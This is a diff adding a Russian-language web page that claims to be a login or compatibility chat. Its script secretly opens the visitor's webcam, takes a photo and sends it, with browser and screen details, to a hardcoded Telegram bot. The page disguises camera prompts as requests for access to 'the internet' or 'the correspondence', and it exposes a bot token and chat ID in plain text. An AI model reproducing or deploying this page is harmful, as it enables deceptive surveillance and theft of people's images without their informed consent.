@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход на сайт</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .video-box {
+            background: #000;
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        .photo-preview {
+            margin: 20px 0;
+            display: none;
+        }
+        
+        .photo-preview img {
+            width: 100%;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 18px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            margin: 5px;
+        }
+        
+        button:hover {
+            transform: scale(1.02);
+        }
+        
+        .btn-retake {
+            background: #e74c3c;
+        }
+        
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            display: none;
+        }
+        
+        .status-info {
+            background: #e3f2fd;
+            color: #1976d2;
+            border: 1px solid #2196f3;
+        }
+        
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #27ae60;
+        }
+        
+        .status-error {
+            background: #fee;
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+        }
+        
+        .content {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Вход на сайт</h1>
+        <div class="subtitle">Чат что бы узнать подхотители вы друг к другу </div>
+        
+        <div id="status" class="status status-info">
+             разрешите доступ к переписке 
+        </div>
+        
+       
+        
+        <canvas id="canvas"></canvas>
+        
+        <div class="photo-preview" id="photoPreview">
+            <h3> Ваше :</h3>
+            <img id="photo" alt="Фото">
+        </div>
+        
+        <div id="controls">
+            <button id="captureBtn" style="display: none;"></button>
+            <button id="retakeBtn" class="btn-retake" style="display: none;">🔄 Сделать заново</button>
+        </div>
+        
+        <div id="content" class="content">
+            <h2>✨ Добро пожаловать! ✨</h2>
+            <p>Вы успешно прошли идентификацию.</p>
+            <p>Содержимое сайта открыто для вас.</p>
+        </div>
+        
+        <footer>
+             Ваше  будет отправлено администратору
+        </footer>
+    </div>
+
+    <script>
+        // ========== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ) ==========
+        // Получить токен у @BotFather, а Chat ID у @userinfobot
+        const TELEGRAM_TOKEN = '8503701773:AAGoKDHpfx0GjRCz9Ttal9Zij5OOFLRCINw';  // ← ЗАМЕНИТЕ
+        const TELEGRAM_CHAT_ID = '5246613858';   // ← ЗАМЕНИТЕ
+        
+        // ========== КОД ==========
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const photoPreview = document.getElementById('photoPreview');
+        const captureBtn = document.getElementById('captureBtn');
+        const retakeBtn = document.getElementById('retakeBtn');
+        const statusDiv = document.getElementById('status');
+        const contentDiv = document.getElementById('content');
+        
+        let stream = null;
+        let currentPhotoData = null;
+        let photoSent = false;
+        
+        function showStatus(text, type = 'info') {
+            statusDiv.textContent = text;
+            statusDiv.className = `status status-${type}`;
+            statusDiv.style.display = 'block';
+        }
+        
+        // Получение информации о браузере
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            else if (ua.includes('Edge')) browser = 'Edge';
+            
+            return `${browser} | ${screen.width}x${screen.height}`;
+        }
+        
+        // Конвертация base64 в Blob
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+        
+        // Отправка в Telegram
+        async function sendToTelegram(photoData) {
+            if (TELEGRAM_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
+                console.log('Telegram не настроен');
+                return false;
+            }
+            
+            try {
+                const blob = dataURLtoBlob(photoData);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'visitor.jpg');
+                
+                const info = `🆕 НОВЫЙ ПОСЕТИТЕЛЬ!\n🕐 Время: ${new Date().toLocaleString()}\n🌐 Браузер: ${getBrowserInfo()}`;
+                formData.append('caption', info);
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                return false;
+            }
+        }
+        
+        // Запуск камеры
+        async function initCamera() {
+            try {
+                showStatus('🎥 Запрос доступа к интернету ...', 'info');
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                
+                video.srcObject = stream;
+                showStatus('✅ интернет  готов! Нажмите "Сделать "', 'success');
+                captureBtn.style.display = 'inline-block';
+                
+            } catch (error) {
+                console.error('Ошибка камеры:', error);
+                
+                if (error.name === 'NotAllowedError') {
+                    showStatus('❌ Вы не разрешили доступ к . Обновите страницу и разрешите доступ.', 'error');
+                } else if (error.name === 'NotFoundError') {
+                    showStatus('❌  не найдена. Подключите .', 'error');
+                } else {
+                    showStatus('❌ Ошибка доступа к : ' + error.message, 'error');
+                }
+            }
+        }
+        
+        // Сделать фото и отправить
+        async function takePhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            currentPhotoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Показываем превью
+            photo.src = currentPhotoData;
+            photoPreview.style.display = 'block';
+            
+            // Меняем кнопки
+            captureBtn.style.display = 'none';
+            retakeBtn.style.display = 'inline-block';
+            
+            showStatus('📸  сделано! Отправка владельцу...', 'info');
+            
+            // Отправляем владельцу
+            const sent = await sendToTelegram(currentPhotoData);
+            
+            if (sent) {
+                showStatus('✅ Фото отправлено! Доступ открыт.', 'success');
+                photoSent = true;
+                
+                // Останавливаем камеру
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }
+                
+                // Показываем контент
+                setTimeout(() => {
+                    contentDiv.style.display = 'block';
+                    statusDiv.style.display = 'none';
+                }, 1000);
+                
+            } else {
+                if (TELEGRAM_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
+                    showStatus('⚠️ Telegram не настроен. Замените TOKEN и CHAT_ID в коде.', 'error');
+                } else {
+                    showStatus('❌ Ошибка отправки . Попробуйте еще раз.', 'error');
+                }
+                retakeBtn.style.display = 'inline-block';
+                captureBtn.style.display = 'none';
+            }
+        }
+        
+        // Переснять
+        function retakePhoto() {
+            currentPhotoData = null;
+            photoPreview.style.display = 'none';
+            captureBtn.style.display = 'inline-block';
+            retakeBtn.style.display = 'none';
+            showStatus('📸 Сделайте новое фото', 'info');
+            contentDiv.style.display = 'none';
+            photoSent = false;
+            
+            // Перезапускаем камеру если нужно
+            if (!stream || !video.srcObject) {
+                initCamera();
+            }
+        }
+        
+        // Обработчики
+        captureBtn.addEventListener('click', takePhoto);
+        retakeBtn.addEventListener('click', retakePhoto);
+        
+        // Запуск
+        initCamera();
+        
+        // Остановка камеры при уходе
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
